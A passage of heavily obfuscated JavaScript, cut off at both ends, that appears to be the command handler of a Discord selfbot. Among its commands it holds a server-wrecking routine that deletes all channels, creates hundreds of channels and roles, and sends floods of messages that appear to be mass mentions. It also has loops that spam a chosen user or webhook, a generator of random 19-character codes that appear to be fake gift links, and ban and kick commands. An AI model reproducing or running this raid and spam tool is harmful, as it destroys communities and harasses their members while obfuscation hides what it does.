_0xa42d[768]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x56=_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[286]]((_0x74d2x52)=>{return `${_0xa42d[26]}${_0x74d2x52[_0xa42d[53]][_0xa42d[52]]}${_0xa42d[769]}${_0x74d2x52[_0xa42d[53]][_0xa42d[245]]}${_0xa42d[20]}`});fs[_0xa42d[772]](_0xa42d[770],JSON[_0xa42d[771]](_0x74d2x56));_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[422]}${bot[_0xa42d[53]][_0xa42d[61]]}${_0xa42d[773]}`)};if(_0x74d2x15=== _0xa42d[774]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!config[_0xa42d[268]]){return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[21])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[775])}${_0xa42d[20]}`)};bot[_0xa42d[53]][_0xa42d[777]](_0xa42d[776],config[_0xa42d[268]]);bot[_0xa42d[53]][_0xa42d[779]](_0xa42d[778],config[_0xa42d[268]])};if(_0x74d2x15=== _0xa42d[780]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x3f=_0x74d2x12[_0xa42d[99]][_0xa42d[186]][_0xa42d[97]]();if(!_0x74d2x3f){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[781])};bot[_0xa42d[53]][_0xa42d[779]](_0x74d2x3f[_0xa42d[52]]);bot[_0xa42d[53]][_0xa42d[777]](_0x74d2x3f[_0xa42d[245]])};if(_0x74d2x15=== _0xa42d[782]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x3f=_0x74d2x12[_0xa42d[99]][_0xa42d[186]][_0xa42d[97]]();if(!_0x74d2x3f){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[781])};bot[_0xa42d[53]][_0xa42d[777]](_0x74d2x3f[_0xa42d[245]])};if(_0x74d2x15=== _0xa42d[783]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x57=_0x74d2x16[0];if(!_0x74d2x16[0]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[784])};_0x74d2x12[_0xa42d[83]][_0xa42d[786]][_0xa42d[310]]((_0x74d2x1f)=>{return _0x74d2x1f[_0xa42d[785]](_0x74d2x57)})};if(_0x74d2x15=== _0xa42d[787]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[_0xa42d[177]](_0xa42d[23])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[788])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[789]}${_0x74d2x12[_0xa42d[86]][_0xa42d[90]](9)[_0xa42d[88]](_0xa42d[20])[_0xa42d[177]](_0xa42d[790])}${_0xa42d[789]}`)};if(_0x74d2x15=== _0xa42d[791]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x3f=_0x74d2x12[_0xa42d[99]][_0xa42d[186]][_0xa42d[97]]();const _0x74d2x52=_0x74d2x12[_0xa42d[81]][_0xa42d[792]](_0x74d2x3f);let _0x74d2x58=_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23]);if(!_0x74d2x58){_0x74d2x58= _0xa42d[793]};if(!_0x74d2x12[_0xa42d[81]][_0xa42d[796]][_0xa42d[795]](_0xa42d[794])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[797])};if(_0x74d2x3f){if(_0x74d2x52){_0x74d2x52[_0xa42d[791]]({reason:_0x74d2x58})[_0xa42d[161]](()=>{_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[540]}${_0x74d2x3f[_0xa42d[59]]}${_0xa42d[798]}`)})}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[799])}}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[800])}};if(_0x74d2x15=== _0xa42d[801]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x3f=_0x74d2x12[_0xa42d[99]][_0xa42d[186]][_0xa42d[97]]();const _0x74d2x52=_0x74d2x12[_0xa42d[81]][_0xa42d[792]](_0x74d2x3f);let _0x74d2x58=_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23]);if(!_0x74d2x58){_0x74d2x58= _0xa42d[793]};if(!_0x74d2x12[_0xa42d[81]][_0xa42d[796]][_0xa42d[795]](_0xa42d[802])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[797])};if(_0x74d2x3f){if(_0x74d2x52){_0x74d2x52[_0xa42d[801]](_0x74d2x58)[_0xa42d[161]](()=>{_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[540]}${_0x74d2x3f[_0xa42d[59]]}${_0xa42d[803]}`)})}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[799])}}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[804])}};if(_0x74d2x15=== _0xa42d[805]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x59=_0x74d2x16[0];const _0x74d2x5a=_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23]);if(!_0x74d2x59){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[806])};if(!_0x74d2x5a){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[807])};_0x74d2x12[_0xa42d[81]][_0xa42d[808]]({name:_0x74d2x5a,color:_0x74d2x59});_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[809]}${_0x74d2x5a}${_0xa42d[810]}`)};if(_0x74d2x15=== _0xa42d[811]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x5a=_0x74d2x12[_0xa42d[81]][_0xa42d[98]][_0xa42d[812]]((_0x74d2x17)=>{return _0x74d2x17[_0xa42d[45]]=== _0x74d2x16[_0xa42d[177]](_0xa42d[23])});if(!_0x74d2x16[_0xa42d[177]](_0xa42d[23])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[813])};if(!_0x74d2x5a){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[814])};_0x74d2x5a[_0xa42d[96]]();_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[815]}${_0x74d2x16[_0xa42d[177]](_0xa42d[23])}${_0xa42d[810]}`)};if(_0x74d2x15=== _0xa42d[816]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x5b=_0x74d2x12[_0xa42d[99]][_0xa42d[98]][_0xa42d[97]]();const _0x74d2x5c=_0x74d2x12[_0xa42d[99]][_0xa42d[380]][_0xa42d[97]]();if(!_0x74d2x5b){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[100])};if(!_0x74d2x5c){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[817])};_0x74d2x5c[_0xa42d[818]](_0x74d2x5b);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[819]}${_0x74d2x5b[_0xa42d[45]]}${_0xa42d[820]}${_0x74d2x5c[_0xa42d[53]][_0xa42d[59]]}${_0xa42d[540]}`)};if(_0x74d2x15=== _0xa42d[821]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x5b=_0x74d2x12[_0xa42d[99]][_0xa42d[98]][_0xa42d[97]]();const _0x74d2x5c=_0x74d2x12[_0xa42d[99]][_0xa42d[380]][_0xa42d[97]]();if(!_0x74d2x5b){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[100])};if(!_0x74d2x5c){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[817])};_0x74d2x5c[_0xa42d[822]](_0x74d2x5b);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[823]}${_0x74d2x5b[_0xa42d[45]]}${_0xa42d[824]}${_0x74d2x5c[_0xa42d[53]][_0xa42d[59]]}${_0xa42d[540]}`)};if(_0x74d2x15=== _0xa42d[825]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[826])};if(_0x74d2x15=== _0xa42d[827]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[828])};if(_0x74d2x15=== _0xa42d[829]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[830])};if(_0x74d2x15=== _0xa42d[831]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[832])};if(_0x74d2x15=== _0xa42d[833]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[81]][_0xa42d[796]][_0xa42d[795]](_0xa42d[834])){_0x74d2x12[_0xa42d[81]][_0xa42d[836]](_0xa42d[835]);_0x74d2x12[_0xa42d[81]][_0xa42d[838]](_0xa42d[837]);_0x74d2x12[_0xa42d[81]][_0xa42d[387]][_0xa42d[310]]((_0x74d2x51)=>{_0x74d2x51[_0xa42d[96]]()});for(var _0x74d2x4e=0;_0x74d2x4e< 100;_0x74d2x4e++){_0x74d2x12[_0xa42d[81]][_0xa42d[840]](_0xa42d[839],{type:_0xa42d[386]})};for(var _0x74d2x4e=0;_0x74d2x4e< 100;_0x74d2x4e++){const _0x74d2x5d=_0x74d2x12[_0xa42d[81]][_0xa42d[45]];_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[184]](_0x74d2x12[_0xa42d[81]][_0xa42d[423]])[_0xa42d[101]](`${_0xa42d[841]}${_0x74d2x5d}${_0xa42d[842]}`)[_0xa42d[285]]((_0x74d2x36)=>{return})};for(var _0x74d2x4e=0;_0x74d2x4e< 100;_0x74d2x4e++){_0x74d2x12[_0xa42d[81]][_0xa42d[840]](_0xa42d[843],{type:_0xa42d[388]})};for(var _0x74d2x4e=0;_0x74d2x4e< 100;_0x74d2x4e++){const _0x74d2x5e= await _0x74d2x12[_0xa42d[81]][_0xa42d[808]]({name:_0xa42d[837],color:_0xa42d[334]});_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[310]]((_0x74d2x52)=>{_0x74d2x52[_0xa42d[818]](_0x74d2x5e[_0xa42d[61]])})}}};if(_0x74d2x15=== _0xa42d[844]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);_0x74d2x12[_0xa42d[81]][_0xa42d[836]](null);_0x74d2x12[_0xa42d[81]][_0xa42d[387]][_0xa42d[310]]((_0x74d2x51)=>{return _0x74d2x51[_0xa42d[96]]()});const _0x74d2x5f= await _0x74d2x12[_0xa42d[81]][_0xa42d[840]](_0xa42d[845],{type:_0xa42d[389]});const _0x74d2x60= await _0x74d2x12[_0xa42d[81]][_0xa42d[840]](_0xa42d[846],{type:_0xa42d[389]});_0x74d2x12[_0xa42d[81]][_0xa42d[840]](_0xa42d[847],{type:_0xa42d[386],parent:_0x74d2x5f[_0xa42d[61]]});_0x74d2x12[_0xa42d[81]][_0xa42d[840]](_0xa42d[848],{type:_0xa42d[388],parent:_0x74d2x60[_0xa42d[61]]})};if(_0x74d2x15=== _0xa42d[849]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x28=[_0xa42d[850],_0xa42d[851],_0xa42d[852],_0xa42d[853],_0xa42d[854],_0xa42d[855],_0xa42d[856],_0xa42d[857],_0xa42d[858]];if(!_0x74d2x16[0]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[859]}${_0x74d2x28[_0xa42d[177]](_0xa42d[375])}${_0xa42d[20]}`)};if(!_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x28){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[859]}${_0x74d2x28[_0xa42d[177]](_0xa42d[375])}${_0xa42d[20]}`)};if(!_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[517])};if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x28[0]){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[540]}${_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])}${_0xa42d[540]}`)}else {if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x28[1]){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[271]}${_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])}${_0xa42d[271]}`)}else {if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x28[2]){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[860]}${_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])}${_0xa42d[860]}`)}else {if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x28[3]){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](colors[_0xa42d[861]](_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])))}else {if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x28[4]){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])[_0xa42d[307]]())}else {if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x28[5]){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])[_0xa42d[511]]())}else {if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x28[6]){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[862]}${_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])}${_0xa42d[862]}`)}else {if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x28[7]){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[789]}${_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])}${_0xa42d[789]}`)}else {if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x28[8]){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[863]}${colors[_0xa42d[861]](_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23])[_0xa42d[307]]())}${_0xa42d[864]}`)}}}}}}}}}};if(_0x74d2x15=== _0xa42d[865]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[0]||  !/\d{1,2}/ig[_0xa42d[866]](_0x74d2x16[0])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[867])}else {var _0x74d2x61=_0x74d2x16[0]};if(!_0x74d2x16[1]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[517])}else {_0x74d2x16[_0xa42d[868]](0,1);var _0x74d2x62=_0x74d2x16[_0xa42d[177]](_0xa42d[23])};for(var _0x74d2x4e=0;_0x74d2x4e< _0x74d2x61;_0x74d2x4e++){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x62)}};if(_0x74d2x15=== _0xa42d[869]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x3f=_0x74d2x12[_0xa42d[99]][_0xa42d[186]][_0xa42d[97]]();if(!_0x74d2x3f){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[781])};const _0x74d2x61=_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23]);if(!_0x74d2x61){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[870])};for(var _0x74d2x4e=0;_0x74d2x4e< _0x74d2x61;_0x74d2x4e++){_0x74d2x3f[_0xa42d[101]](_0xa42d[871])}};if(_0x74d2x15=== _0xa42d[872]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[0]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[873])};const _0x74d2x61=_0x74d2x16[0];function _0x74d2x4c(){let _0x74d2x2a=_0xa42d[20];let _0x74d2x4d=_0xa42d[464];for(var _0x74d2x4e=0;_0x74d2x4e< 19;_0x74d2x4e++){_0x74d2x2a= _0x74d2x2a+ _0x74d2x4d[_0xa42d[465]](Math[_0xa42d[197]](Math[_0xa42d[195]]()* _0x74d2x4d[_0xa42d[196]]))};return _0x74d2x2a}for(var _0x74d2x4e=0;_0x74d2x4e< _0x74d2x61;_0x74d2x4e++){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[466]}${_0x74d2x4c()}${_0xa42d[20]}`)}};if(_0x74d2x15=== _0xa42d[874]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!config[_0xa42d[272]]){return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[21])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[875])}${_0xa42d[20]}`)};const _0x74d2x61=_0x74d2x16[0];const _0x74d2x62=_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23]);if(!_0x74d2x61){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[876])};if(!_0x74d2x62){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[877])};if(`${_0xa42d[26]}${_0x74d2x12[_0xa42d[81]][_0xa42d[426]]}${_0xa42d[31]}${_0x74d2x12[_0xa42d[81]][_0xa42d[45]]}${_0xa42d[20]}`[_0xa42d[196]]> 40){return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](`${_0xa42d[21]}`)}${_0xa42d[23]}${colors[_0xa42d[24]](`${_0xa42d[878]}`)}${_0xa42d[20]}`)};const _0x74d2x63= new webhook.Webhook(config[_0xa42d[272]]);for(var _0x74d2x4e=0;_0x74d2x4e< _0x74d2x61;_0x74d2x4e++){const _0x74d2x64= new webhook.MessageBuilder()[_0xa42d[838]](`${_0xa42d[26]}${_0x74d2x12[_0xa42d[81]][_0xa42d[426]]}${_0xa42d[31]}${_0x74d2x12[_0xa42d[81]][_0xa42d[45]]}${_0xa42d[20]}`)[_0xa42d[777]](_0x74d2x12[_0xa42d[81]][_0xa42d[428]])[_0xa42d[881]](_0xa42d[880])[_0xa42d[112]](_0xa42d[879])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](_0x74d2x62);_0x74d2x63[_0xa42d[101]](_0x74d2x64)}};if(_0x74d2x15=== _0xa42d[882]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};let _0x74d2x65;const _0x74d2x66=_0x74d2x16[0];const _0x74d2x3a=_0x74d2x16[1];if(!_0x74d2x3a== _0xa42d[883] || !_0x74d2x3a== _0xa42d[884]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[885])};if(_0x74d2x3a=== _0xa42d[883]){_0x74d2x65= `${_0xa42d[886]}${_0x74d2x16[_0xa42d[90]](2)[_0xa42d[177]](_0xa42d[23])}${_0xa42d[20]}`};if(_0x74d2x3a=== _0xa42d[884]){_0x74d2x65= _0x74d2x16[_0xa42d[90]](2)[_0xa42d[177]](_0xa42d[23])};if(!_0x74d2x66[_0xa42d[91]](_0xa42d[887])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[888])};const _0x74d2x67= new webhook.Webhook(_0x74d2x66);for(var _0x74d2x4e=0;_0x74d2x4e< 100;_0x74d2x4e++){const _0x74d2x68= new 